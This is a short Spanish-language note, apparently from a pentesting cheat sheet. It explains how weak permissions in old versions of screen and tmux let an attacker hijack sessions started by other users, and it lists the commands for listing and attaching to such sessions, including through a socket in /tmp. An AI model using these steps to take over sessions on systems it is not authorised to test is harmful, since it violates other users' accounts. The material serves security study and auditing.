Hijacking de Sesiones

En versiones antiguas, era posible abusar de los permisos débiles de las aplicaciones como screen y tmux, lo que permitía realizar el hijacking de sesiones iniciadas por otros usuarios.

Para realizar esta operación con screen: 

#Listar las sesiones disponibles
screen -ls
#Conectarse a la sesión
screen -dr [session]

Para realizar esta operación con tmux: 

#Sessiones de tmux
tmux ls
#Conectarse a la sesión
tmux attach -t myname
tmux -S /tmp/dev_sess attach -t 0
